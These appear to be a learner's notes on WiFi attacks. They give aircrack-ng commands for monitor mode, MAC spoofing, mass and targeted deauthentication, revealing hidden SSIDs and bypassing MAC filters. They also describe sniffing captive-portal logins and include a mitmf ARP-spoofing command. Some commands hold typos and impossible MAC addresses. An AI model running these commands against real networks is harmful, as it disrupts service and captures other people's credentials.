## WiFi Bands
-----------
● Decides the frequency range that can be used. 
● Determines the channels that can be used. 
● Clients need to support band used by router to communicate with it. 
● Data can be sniffed from a certain band if the wireless adapter used supports that band.

● Most common WiFi Bands are: 
 ○ a uses 5 Ghz frequency only. 
 ○ b, g both use 2.4 Ghz frequency only. 
 ○ n uses 5 and 2.4 Ghz. 
 ○ ac uses frequencies lower than 6 Gh
 
Enabling monitor mode
----------------------
>iwconfig
>airmon-ng check kill  
>airmon-ng start wlan1 
>airodump-ng wlan1mon 
or
>airodump-ng --band a wlan1mon (show all type of wifi networks)

Pre-connection Attacks
-----------------------
 1.Mac address changing
 2.Deauthenticating All Clients From Protected WiFi Network
 3.Deauthenticating a Client From Protected WiFi Networks
    mac changing
    ............
    ifconfig wlan0 down
    ifconfig wlan0 hw ether 00:ff:ff:ff:44:55
    ifconfig wlan0 up
    ifconfig wlan0

    Deauthenticating All Clients From Protected WiFi Network
    ........................................................
    airodump-ng -bssid 44:55:tt:ee:ee:bb --channel 11 wlan0
    aireplay-ng --deauth 10000000 -a 44:55:tt:ee:ee:bb wlan0

    Deauthenticating a Client From Protected WiFi Networks
    ......................................................
    aireplay-ng --deauth 10000000 -a 44:55:tt:ee:ee:bb -c 22:dd:33:44:55:66 wlan0

Gaining Access
---------------
1.Find SSID of hidden networks
2.Bypass mac filtering
3.To gain access to
  - Captive portals
  - WEP
  - WPA
  - WPA 2
  - WPA/WPA2 Enterpise
4.Fake Access Point

  Discovering Names of Hidden Networks
  .....................................
    airodump-ng --bssid 44:55:tt:ee:ee:bb --channel 6 wlan0
    airoplay-ng --deauth 4 -a 44:55:tt:ee:ee:bb -c 22:dd:33:44:55:66 wlan0

  Bypassing Mac Filtering (Blacklists & Whitelists)
  ..................................................
    ifconfig wlan0 down
    macchanger -m 22:dd:33:44:55:66 wlan0

  Bypassing Captive portals
  ..........................
     1.Change mac address to one of a connencted client.
     2.Sniff logins in monitor mode.
       - Since captive portals are OPEN.
       - IE: they do not use encryption.
       - We can sniff data sent to/from it using airodump-ng
       - Then use WIRESHARK to read this data including passwords.
     3.Create a fake AP, ask users to login.
     4.Connect and sniff logins after running an arp spoofing attack.
       - Since captive portal are open.
       - Therefore we can connect to the target without a password.
       - We can then run a normal arp spoofing attack.
       = clients will autoatically lose their connection and will be asked to login again.
       = Dta sent to/from router including passwords will be directed to us.
mitmf --arp --spoof -i wlan0 --gateway 192.168.10.1
